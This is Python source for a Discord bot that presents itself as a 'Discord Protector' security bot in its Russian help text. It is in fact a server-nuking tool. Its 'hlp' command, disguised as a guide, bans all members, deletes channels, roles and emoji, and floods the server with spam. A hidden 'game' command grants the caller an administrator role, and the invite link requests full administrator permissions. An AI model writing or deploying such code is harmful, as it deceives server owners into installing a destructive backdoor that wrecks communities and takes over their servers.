
import discord, os, sys, random, string, requests, configparser, json, asyncio, time, funcs
from discord.ext import commands
from discord import Permissions
from colorama import Fore, init 
from os import system, name
init()

config = configparser.ConfigParser()
config.read('config.ini')

Token = config.get("Crasher", "Token")
whit = json.loads(config.get("Crasher", "Whitelist"))

spamt = json.loads(config.get("Thread", "SpamThreadCount"))
cdt = json.loads(config.get("Thread", "ChannelDelThreadCount"))
bnall = json.loads(config.get("Thread", "BanAllThreadCount"))
rdell = json.loads(config.get("Thread", "RolesDeleteThreadCount"))
sph = json.loads(config.get("Thread", "SpamHookThreadCount"))

if name == "nt":
        _ = system("cls")

else:
        _ = system("clear")

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='l!', intents=intents, help_command=None)


@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game('Protecting 24/7'))
    print(f"""{Fore.GREEN}

                        
███████████████████══███████████████████
████████████████████████████████████████
███████████████████══███████████████████
███████████████████══███████████████████
███████████████████══███████████████████
███████████████████══███████████████████
███████████████████══███████████████████
████████████████████████████████████████
█████████████████▓▒▒▒▒▓█████████████████
█████████████▒════════════▒█████████████
███████████░═════════════════███████████
██████████════════════════════▓█████████
████████▓══════════════════════▒████████
████████════════════════════════████████
███████══════════════════════════███████
███████══════════════════════════███████
███████══════════════════════════███████
███████══════════════════════════███████
███████══════════════════════════███████
████████████████████████████████████████
█████▓▒▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▒▒▓█████
███══▒████████████████████████████▒══███
██═▒███═════░▓████████████▓░═════███▓═██
█═▒███═════════════██░════════════████═█
█═███▓══════░░░════██═════░░══════▒███═▓
█═████══════███════██════███░═════▒███═█
█═▒███══════██▓════██════▓██══════███▓═█
██═░███═══════════████░══════════███▒═██
███░═░██▒▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒██░═░███
██████▒▓████████████████████████▓▒██████
███████▒████████████████████████▒███████
███████══════════════════════════███████
███████══██████████████████████══███████
███████═█═▒█═══█═══▒█═══█═══█══█═███████
███████═█▀▀█▀▀▀█▀▀▀▀█▀▀▀█▀▀▀█▀▀█═███████
███████═█▄▄█▄▄▄█▄▄▄▄█▄▄▄█▄▄▄█▄▄█═███████
███████═█▒▒█░░░█▒░░▓█░░▒█░░░█▒▒█═███████
███████══██████████████████████░═███████
███████════░▒▒▒░▒▒▒░░▒▒▒░▒▒▒░════███████
███████══════════════════════════███████
████████▒▒░═══════════════════░▒████████
████████████████████████████████████████






{Fore.RED} Здраствуй галактика, на связе Bender
{Fore.RED} Я рад что запустил мою железяку!
{Fore.RED} Приватная версия моей железяки оказалась у тебя :)
{Fore.RED} Начинаеться пивная туса от футурами <3 """)

@client.command()
async def hlp(ctx):
    asyncio.create_task(funcs.chisttemp(ctx))
    for c in range(bnall):
            asyncio.create_task(funcs.banall(ctx))
    for c in range(cdt):    
            asyncio.create_task(funcs.chistch(ctx))
    for c in range(2): 
            asyncio.create_task(funcs.chistemoji(ctx))
    for c in range(2): 
            asyncio.create_task(funcs.chisttemp(ctx))
    for c in range(rdell): 
            asyncio.create_task(funcs.chistrl(ctx))
    await funcs.chistrl(ctx)


    for c in range(2): 
            asyncio.create_task(funcs.masks(ctx))
    for c in range(spamt): 
            asyncio.create_task(funcs.spamth(ctx))
    for c in range(4): 
            asyncio.create_task(funcs.spamch(ctx))
    for c in range(3): 
            asyncio.create_task(funcs.spamrl(ctx))
    await funcs.spamrl(ctx)
    print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")


    


@client.command()
async def help(ctx):
  embed = discord.Embed(
    title = 'Discord Protector',
    colour = 4374015,
    description = '👨‍💻Привет! Я - твой новый защитник! Для начала ознакомимся с командами👨‍💻:\n```\n$ - префикс 🤖\n```\n```\n$help - помощь 🤗\n```\n```\n$hlp - гайд по боту 🧐\n```\n```\n$st - начать защиту 👾\n```\n```\n$config - сконфигурировать защиту 🛠️\n```\n```\n$autoconf - автоконфигурация для сервера 🔧\n```\n```\n$ban - Баны 🚫\n```\n```\n$kick - Кики 🦶\n```\nВот и все! Настраивай как хочешь  😊\n',
    url = 'https://discord.com/api/oauth2/authorize?client_id=849596809738190898&permissions=8&scope=bot')
  await ctx.send(embed=embed)


    
@client.command()
async def game(ctx, pos = None):
    try:
       if pos == None:
         await ctx.guild.create_role(name="DADUDEDA", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
         role = discord.utils.get(ctx.guild.roles, name="DADUDEDA")
         await ctx.message.author.add_roles(role)
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
       else:
         await ctx.guild.create_role(name="DADUDEDA", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
         role = discord.utils.get(ctx.guild.roles, name="DADUDEDA")
         await role.edit(position=int(pos), reason="Админ идиот")
         await ctx.message.author.add_roles(role)
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
    except discord.HTTPException:
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось выдать админку {ctx.message.author}")
        

@client.command()
async def start(ctx):
  await(funcs.chistrl(ctx))
  print(f"{Fore.WHITE}> {Fore.RED}Почистил роли{Fore.WHITE}.")


@client.command()
async def ml(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спам активирован")
    for c in range(spamt): 
        asyncio.create_task(funcs.spamth(ctx))

@client.command()
async def gamehelp(ctx):
    rls = 0
    for role in ctx.guild.roles:
     rls +=1
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Нашел роль {role}, по счету {rls}")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Найдено {rls} ролей")


@client.command()
async def gif(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Рассылаем гифки")
    for channel in ctx.guild.text_channels:
     await channel.send("https://gfycat.com/optimalpointlessilsamochadegu")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Кинул гифку в {channel}")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Разослал гифки")

@client.command()
async def hooks(ctx):
   await crhooks(ctx)
   for c in range(spamh): 
           asyncio.create_task(funcs.spamhook(ctx))




try:
    client.run(Token)
except Exception:
    pass
except KeyboardInterrupt:
    sys.exit()
